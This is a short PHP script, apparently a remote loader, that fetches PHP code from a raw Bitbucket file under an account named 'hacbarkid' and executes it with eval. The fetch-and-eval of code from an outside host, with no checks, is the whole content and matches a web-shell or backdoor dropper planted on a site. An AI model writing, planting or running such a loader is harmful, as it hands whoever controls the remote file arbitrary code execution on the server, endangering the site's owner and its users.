<?php
    $Url = "https://bitbucket.org/hacbarkid/maybey/raw/f48f95e262331030a0ed4b923d08418338a69cb2/main.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>